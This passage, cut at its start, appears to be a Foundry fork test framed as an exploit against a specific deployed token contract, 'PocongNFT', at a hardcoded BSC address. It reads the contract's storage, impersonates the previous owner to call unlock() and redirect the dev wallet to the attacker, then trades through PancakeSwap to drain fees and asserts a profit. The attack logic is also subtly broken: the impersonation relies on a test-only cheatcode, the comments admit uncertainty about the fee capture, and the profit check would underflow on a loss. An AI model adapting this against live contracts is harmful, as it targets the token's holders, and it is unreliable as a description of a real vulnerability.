}

interface PocongNFT {
    function owner() external view returns (address);
    function unlock() external;
    function setDevWallet(address newWallet) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: give attacker some ETH
        vm.deal(attacker, 10 ether);

        // Label addresses for debugging
        vm.label(TARGET, "PocongNFT");
        vm.label(attacker, "Attacker");

        // Check current owner
        address currentOwner = PocongNFT(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // If owner is address(0), lock() was likely called
        if (currentOwner == address(0)) {
            // Read storage slot 1 (_previousOwner) from Ownable contract
            // Ownable storage layout: slot 0 = _owner, slot 1 = _previousOwner, slot 2 = _lockTime
            bytes32 prevOwnerSlot = vm.load(TARGET, bytes32(uint256(1)));
            address previousOwner = address(uint160(uint256(prevOwnerSlot)));
            console.log("Previous owner from storage:", previousOwner);

            if (previousOwner != address(0)) {
                // Impersonate previousOwner and unlock
                vm.startPrank(previousOwner);
                PocongNFT(TARGET).unlock();
                vm.stopPrank();

                // Verify unlock succeeded
                address newOwner = PocongNFT(TARGET).owner();
                console.log("New owner after unlock:", newOwner);

                if (newOwner == previousOwner) {
                    // Now set dev wallet to attacker
                    vm.startPrank(previousOwner);
                    PocongNFT(TARGET).setDevWallet(attacker);
                    vm.stopPrank();
                    console.log("Successfully set dev wallet to attacker");
                }
            }
        }
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker ETH balance:", initialBalance);

        // Generate trading volume to accumulate dev fees
        // We need to interact with PancakeSwap router
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        address weth = router.WETH();

        // Buy tokens with 0.5 ETH
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        uint256[] memory amounts = router.swapExactETHForTokens{value: 0.5 ether}(
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1 hours
        );
        console.log("Bought token amount:", amounts[1]);

        // Approve router to spend our tokens
        PocongNFT(TARGET).approve(routerAddress, type(uint256).max);

        // Sell tokens to generate dev fees
        path[0] = TARGET;
        path[1] = weth;
        uint256 sellAmount = amounts[1] / 2;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1 hours
        );

        console.log("Sold tokens, dev fees should be accumulating");

        // The contract now has dev fee tokens that will be swapped to ETH
        // and sent to dev wallet (our address). We may need to trigger
        // swapAndLiquify by sending more tokens to contract

        // Check final balance
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker ETH balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // Verify profit
        assertGt(finalBalance, initialBalance, "Attacker ETH balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

